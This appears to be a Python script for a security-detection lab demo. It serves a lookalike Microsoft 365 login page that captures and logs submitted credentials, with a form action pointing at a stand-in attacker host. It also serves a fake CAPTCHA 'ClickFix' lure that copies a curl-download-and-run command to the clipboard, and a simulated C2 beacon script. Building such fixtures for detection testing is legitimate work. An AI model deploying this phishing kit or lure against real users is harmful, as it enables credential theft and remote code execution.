#!/usr/bin/env python3
"""Lightweight mock credential harvesting portal for VerifyEye demonstration.

Serves an authentic-looking Microsoft 365 SSO portal that posts to an
external off-domain harvesting action endpoint, simulating a zero-hour
phishing landing page delivered via Flipper Zero BadUSB or Evil Portal.
"""

import argparse
import http.server
import socketserver

HTML_PAYLOAD = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account - Microsoft 365</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            color: #f8fafc;
        }
        .login-card {
            background: rgba(30, 41, 59, 0.85);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 40px;
            width: 380px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
        }
        .logo-box {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 24px;
        }
        .logo-box h2 {
            margin: 0;
            font-size: 1.4rem;
            color: #38bdf8;
            font-weight: 600;
        }
        .subtitle {
            color: #94a3b8;
            font-size: 0.95rem;
            margin-bottom: 28px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            font-size: 0.85rem;
            margin-bottom: 8px;
            color: #cbd5e1;
        }
        input {
            width: 100%;
            box-sizing: border-box;
            padding: 12px 14px;
            border-radius: 6px;
            border: 1px solid #475569;
            background: #0f172a;
            color: #fff;
            font-size: 0.95rem;
            outline: none;
            transition: border-color 0.2s;
        }
        input:focus {
            border-color: #38bdf8;
        }
        .btn-submit {
            width: 100%;
            padding: 12px;
            background: #0284c7;
            color: #fff;
            border: none;
            border-radius: 6px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 10px;
        }
        .btn-submit:hover {
            background: #0369a1;
        }
        .footer {
            margin-top: 24px;
            font-size: 0.8rem;
            color: #64748b;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="login-card">
        <div class="logo-box">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                <rect width="11" height="11" fill="#f25022"/>
                <rect x="13" width="11" height="11" fill="#7fba00"/>
                <rect y="13" width="11" height="11" fill="#00a4ef"/>
                <rect x="13" y="13" width="11" height="11" fill="#ffb900"/>
            </svg>
            <h2>Microsoft 365</h2>
        </div>
        <div class="subtitle">Sign in to your account to continue</div>
        
        <!-- Malicious harvesting form: keeps off-domain action attribute for VerifyEye DOM detection
             while posting live lab telemetry to /api/v1/harvest and chaining to /captcha -->
        <form action="http://evil-c2-collector.net/api/v1/harvest" method="POST"
              onsubmit="event.preventDefault(); fetch('/api/v1/harvest', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body: new URLSearchParams(new FormData(this))}).finally(() => { window.location.href = '/captcha'; });">
            <div class="form-group">
                <label for="username">Email, phone, or Skype</label>
                <input type="email" id="username" name="email" placeholder="user@company.com" required autocomplete="off">
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="••••••••" required>
            </div>
            <button type="submit" class="btn-submit">Sign in</button>
        </form>

        <div class="footer">
            Protected by Enterprise Identity Safeguard (Simulated Ingress Target)<br><br>
            <a href="/captcha" style="color:#38bdf8;text-decoration:none;">Verify browser security check</a>
            &nbsp;&middot;&nbsp;
            <a href="/download/OmniGuardDemoClient.txt" style="color:#94a3b8;text-decoration:none;">Download Enterprise Client</a>
        </div>
    </div>
</body>
</html>
"""

CAPTCHA_HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification - Microsoft 365</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, sans-serif;
            background: #0f172a;
            color: #f8fafc;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
        }
        .box {
            background: #1e293b;
            border: 1px solid #334155;
            border-radius: 12px;
            padding: 32px;
            width: 440px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.45);
        }
        h2 { margin: 0 0 8px; font-size: 1.25rem; color: #38bdf8; }
        p { color: #94a3b8; font-size: 0.9rem; line-height: 1.45; }
        .check-row {
            display: flex; align-items: center; gap: 12px;
            background: #0f172a; border: 1px solid #475569; border-radius: 8px;
            padding: 14px 16px; margin: 18px 0; cursor: pointer;
        }
        .steps {
            display: none; background: #090e1a; border: 1px solid #334155;
            border-radius: 8px; padding: 14px 16px; margin-top: 12px; font-size: 0.88rem;
        }
        code {
            display: block; margin-top: 8px; padding: 8px 10px;
            background: #0f172a; border-radius: 6px; color: #34d399;
            font-family: monospace; font-size: 0.82rem; word-break: break-all;
        }
        .badge {
            margin-top: 16px; font-size: 0.75rem; color: #64748b; text-align: center;
        }
    </style>
</head>
<body>
    <div class="box">
        <h2>Browser Security Verification</h2>
        <p>Please complete the quick verification step below to access your Microsoft 365 workspace.</p>
        <label class="check-row" onclick="showSteps()">
            <input type="checkbox" id="chk">
            <span>I am not a robot (Simulated ClickFix Lab Lure)</span>
        </label>
        <div id="steps" class="steps">
            <strong>Simulated Demo Steps (Lab Test Only):</strong>
            <ol style="margin:8px 0 0 18px; color:#cbd5e1;">
                <li>The benign OmniGuard telemetry beacon command has been copied to your clipboard.</li>
                <li>In your lab terminal, press <b>Ctrl+V</b> and <b>Enter</b> to trigger SpectraC2 detection.</li>
            </ol>
            <code id="cmd">__DEMO_CMD__</code>
        </div>
        <div class="badge">OmniGuard SOC Closed-Network Lab Fixture &middot; Benign Simulation Only</div>
    </div>
    <script>
        function showSteps() {
            const box = document.getElementById('steps');
            box.style.display = 'block';
            const cmd = document.getElementById('cmd').innerText;
            if (navigator.clipboard && navigator.clipboard.writeText) {
                navigator.clipboard.writeText(cmd).catch(() => {});
            }
        }
    </script>
</body>
</html>
"""

DEMO_CMD = "curl -s http://__PORTAL_HOST__/payload/beacon.py -o /tmp/rmm_watchdog_sim.py && python3 /tmp/rmm_watchdog_sim.py"

ZERO_DEP_BEACON_PY = '''#!/usr/bin/env python3
"""Safe, zero-dependency OmniGuard Lab Beacon & RMM-Watchdog Simulator.
Served from mock_portal.py for closed-network ClickFix / C2 live demos.
"""
import json, random, socket, sys, time, urllib.request

SERVER = "__C2_URL__"
API_URL = "__SOC_URL__"
HOST = "__VICTIM_HOST__"
INTERVAL = 2.0


def _local_ip(target_host, target_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((target_host, target_port))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


c2_host = SERVER.split("//", 1)[-1].split(":", 1)[0]
c2_port = int(SERVER.rsplit(":", 1)[-1])
SRC_IP = _local_ip(c2_host, c2_port)
print(f"[SIM] RMM Watchdog / C2 Beacon active on {HOST} ({SRC_IP}) -> C2={SERVER} (SOC={API_URL})")
alerted = False
seq = 0
while True:
    seq += 1
    try:
        req = urllib.request.Request(
            f"{SERVER}/botDEMO_LAB_TOKEN/sendMessage",
            data=json.dumps({
                "chat_id": "demo-c2-channel",
                "text": f"ScreenConnect Watchdog | Computer: {HOST} | Heartbeat #{seq} (Simulated T1219/T1102)",
            }).encode(),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=3) as r:
            print(f"[{time.strftime('%H:%M:%S')}] Beacon #{seq:02d} -> {SERVER} (HTTP {r.status})")
    except Exception as e:
        print(f"[{time.strftime('%H:%M:%S')}] Beacon #{seq:02d} -> {SERVER} (BLOCKED/ERR: {e})")

    if seq >= 4 and not alerted:
        payload = {
            "source": "spectrac2",
            "event_type": "rmm_watchdog_c2_beaconing",
            "severity": "critical",
            "host": HOST,
            "user": "victim",
            "src_ip": SRC_IP,
            "dst_ip": c2_host,
            "dst_port": c2_port,
            "domain": c2_host,
            "beacon_interval": INTERVAL,
            "mean_jitter": 0.2,
            "process_name": "powershell-rmm-watchdog-sim",
            "mitre_technique": "T1219",
            "confidence": 0.94,
            "description": f"ClickFix-delivered RMM/Telegram C2 watchdog beaconing to {SERVER} ({INTERVAL}s periodicity).",
        }
        try:
            areq = urllib.request.Request(
                f"{API_URL}/alerts",
                data=json.dumps(payload).encode(),
                headers={"Content-Type": "application/json"},
                method="POST",
            )
            with urllib.request.urlopen(areq, timeout=4) as ar:
                print(f"[SOC] Alert ingested -> HTTP {ar.status}")
                alerted = True
        except Exception as ae:
            print(f"[SOC] Alert post failed: {ae}")

    time.sleep(max(0.8, INTERVAL + random.uniform(-0.3, 0.3)))
'''


class PortalHandler(http.server.SimpleHTTPRequestHandler):
    def _host_only(self) -> str:
        hdr = self.headers.get("Host") or "127.0.0.1:8080"
        return hdr.split(":", 1)[0]

    def do_GET(self):
        path = self.path.split("?", 1)[0]
        portal_host = self.headers.get("Host") or "127.0.0.1:8080"
        base_ip = self._host_only()

        if path in ("/captcha", "/verify-human"):
            cmd = DEMO_CMD.replace("__PORTAL_HOST__", portal_host)
            body = CAPTCHA_HTML_TEMPLATE.replace("__DEMO_CMD__", cmd).encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        if path == "/payload/beacon.py":
            script = (
                ZERO_DEP_BEACON_PY
                .replace("__C2_URL__", f"http://{base_ip}:9000")
                .replace("__SOC_URL__", f"http://{base_ip}:8000")
                .replace("__VICTIM_HOST__", "kali-victim")
            ).encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "text/x-python; charset=utf-8")
            self.send_header("Content-Length", str(len(script)))
            self.end_headers()
            self.wfile.write(script)
            return
        if path.startswith("/download/"):
            stub = (
                "OmniGuard SOC Lab Demo Stub\n"
                "This harmless text file simulates a downloaded client artifact for VerifyEye/SpectraC2 demos.\n"
                f"To trigger the benign C2 beacon telemetry in the lab, run:\n{DEMO_CMD}\n"
            ).encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Disposition", 'attachment; filename="OmniGuardDemoClient.txt"')
            self.send_header("Content-Length", str(len(stub)))
            self.end_headers()
            self.wfile.write(stub)
            return
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(HTML_PAYLOAD.encode("utf-8"))))
        self.end_headers()
        self.wfile.write(HTML_PAYLOAD.encode("utf-8"))

    def do_POST(self):
        # Even if credentials submit here, return 200 OK
        content_len = max(0, min(int(self.headers.get("Content-Length", 0)), 65536))
        post_data = self.rfile.read(content_len) if content_len > 0 else b""
        print(f"[!] Harvested submission from {self.address_string()}: {post_data.decode('utf-8', errors='ignore')}", flush=True)
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(b'{"status": "captured"}')

    def log_message(self, format, *args):
        print(f"[MockPortal] {self.address_string()} - {format % args}", flush=True)


def main():
    global DEMO_CMD
    parser = argparse.ArgumentParser(description="Mock Credential & ClickFix Portal for VerifyEye Demo")
    parser.add_argument("--port", type=int, default=8080, help="Port to serve portal on (default: 8080)")
    parser.add_argument("--host", default="0.0.0.0", help="Host interface (default: 0.0.0.0)")
    parser.add_argument("--demo-cmd", default=DEMO_CMD, help="Benign lab beacon command shown on /captcha")
    args = parser.parse_args()
    DEMO_CMD = args.demo_cmd

    server_address = (args.host, args.port)
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.ThreadingTCPServer(server_address, PortalHandler) as httpd:
        print(f"[+] Mock Phishing Portal live at http://{args.host}:{args.port}/login.html")
        print(f"[+] Fake CAPTCHA (ClickFix) lure at http://{args.host}:{args.port}/captcha")
        print(f"[+] Demo artifact download at http://{args.host}:{args.port}/download/OmniGuardDemoClient.txt")
        print("[+] Point Flipper Zero BadUSB or VerifyEye crawler here.")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[-] Shutting down portal.")

if __name__ == "__main__":
    main()
